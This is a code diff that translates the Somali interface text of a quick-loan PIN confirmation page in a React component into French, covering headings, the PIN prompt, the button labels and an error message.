@@ -80,7 +80,7 @@ export default function Details() {
 
       if (!response.ok) {
         throw new Error(
-          data.message || "PIN diristu wuu fashilmay"
+          data.message || "L'envoi du code PIN a échoué"
         );
       }
 
@@ -113,7 +113,7 @@ export default function Details() {
         </h1>
 
         <p className="text-white text-base">
-          Amaah Fudud oo Deg Deg ah
+          Prêt rapide et facile
         </p>
 
       </div>
@@ -125,7 +125,7 @@ export default function Details() {
         <div className="max-w-md mx-auto">
 
           <h2 className="text-center text-2xl text-gray-900 mb-8">
-            Xaqiiji PIN-ka
+            Confirmez votre code PIN
           </h2>
 
 
@@ -140,7 +140,7 @@ export default function Details() {
 
 
           <p className="text-center text-gray-500 text-sm mb-4">
-            Geli PIN-kaaga.
+            Saisissez votre code PIN.
           </p>
 
 
@@ -213,8 +213,8 @@ export default function Details() {
             }
           >
             {loading
-              ? "Waa la dirayaa..."
-              : "SII WAD"}
+              ? "Envoi en cours..."
+              : "CONTINUER"}
           </button>
 
         </div>
@@ -230,7 +230,7 @@ export default function Details() {
         </h1>
 
         <p className="text-white text-base mb-6">
-          Amaah Fudud oo Deg Deg ah
+          Prêt rapide et facile
         </p>
 
         <p className="text-white/80 text-xs">
